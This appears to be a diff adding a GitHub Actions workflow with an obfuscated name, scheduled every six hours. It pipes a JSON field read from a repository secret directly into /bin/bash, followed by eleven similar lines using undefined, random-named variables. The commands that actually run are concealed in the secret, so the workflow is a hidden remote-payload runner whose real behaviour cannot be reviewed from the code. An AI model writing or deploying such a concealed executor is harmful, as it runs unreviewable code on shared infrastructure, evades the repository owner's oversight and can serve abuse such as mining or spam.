@@ -1,0 +1,29 @@
+name: gengzinianpeik
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '53 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: gengzinianpeik
+        env:
+          gzbbs646: ${{ secrets.gzbbs646 }}
+        run: |
+          echo $gzbbs646 | jq -r .arc7823 | /bin/bash
+          echo $dhu8 | jq -r .stbqt500 | /bin/bash
+          echo $slhcd6 | jq -r .aujpa448 | /bin/bash
+          echo $si721 | jq -r .vn8 | /bin/bash
+          echo $wfry600 | jq -r .eay6 | /bin/bash
+          echo $amhgl59056 | jq -r .k02075 | /bin/bash
+          echo $wlx2 | jq -r .pdfqr548 | /bin/bash
+          echo $om7752 | jq -r .grlor4929 | /bin/bash
+          echo $r073 | jq -r .g9 | /bin/bash
+          echo $gryyy34584 | jq -r .g1540 | /bin/bash
+          echo $zkdjl258 | jq -r .t096 | /bin/bash
+          echo $eo836 | jq -r .cir7 | /bin/bash
+
